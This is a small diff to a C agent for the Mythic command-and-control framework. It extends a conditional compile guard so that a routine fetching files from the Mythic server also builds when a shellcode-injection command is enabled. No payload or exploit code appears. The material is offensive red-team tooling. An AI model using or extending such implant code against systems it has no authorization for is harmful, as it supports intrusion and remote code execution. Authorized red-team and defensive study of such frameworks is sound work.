@@ -6,7 +6,7 @@
 #include "Task.h"
 
 
-#if defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY)
+#if defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_INJECT_SHELLCODE)
 /**
  * @brief Fetches a file from Mythic server using its UUID
  * 
@@ -140,7 +140,7 @@ END:
     return Status;
 }
 
-#endif // INCLUDE_CMD_UPLOAD || INCLUDE_CMD_INLINE_EXECUTE || INCLUDE_CMD_EXECUTE_ASSEMBLY
+#endif // INCLUDE_CMD_UPLOAD || INCLUDE_CMD_INLINE_EXECUTE || INCLUDE_CMD_EXECUTE_ASSEMBLY || INCLUDE_CMD_INJECT_SHELLCODE
 
 // Another function where it writes the file to disk?
 
